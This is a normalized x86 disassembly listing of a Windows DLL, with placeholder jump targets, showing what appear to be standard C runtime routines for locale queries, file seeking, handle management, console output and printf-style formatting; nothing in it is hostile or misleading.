push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001fba9
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10010789
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_10016c6f
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1001338e
pop ecx
cmp eax esi
je r-xdata
call sub_1001f7c0
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_1001fce8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001fba9
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001fd25
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10020252
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_100167f3
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_10016819
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1001fdaa
push 0x14
push r--data
call sub_10018984
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
call sub_100167f3
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10016806
mov [ eax ] edi
call sub_100167f3
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fd25
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001feb9
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1001fec3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_100167f3
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10010b6c
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_1001ff27
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_100221e4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10010789
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_1001ffec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1001f196
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_100167f3
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10020120
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1002014b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_100201cc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10020252
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_10016806
mov [ eax ] esi
call sub_100167f3
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_100202c9
push 0xc
push r--data
call sub_10018984
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10020360
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1001d612
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10020369
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10020390
push 0x18
push r--data
call sub_10018984
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1001a3c7
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10020521
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_100189c9
retn
push 0x40
push 0x20
call sub_100166ee
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_100202c9
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1001a48a
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10020463
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_1001d612
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_10020540
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_100137b8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_100167f3
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_100167f3
mov [ eax ] 0x2a
call sub_100167f3
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_100167f3
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10011a90
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10011a90
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_100206c9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_10018f74
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_100206fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_100206c9
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_10020722
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_100206c9
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_100167f3
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_100206c9
sub_1002076f
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_100137b8
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_100190d8
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_100167f3
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_1002131f ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_1001f196
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_100206c9
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_100206c9
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
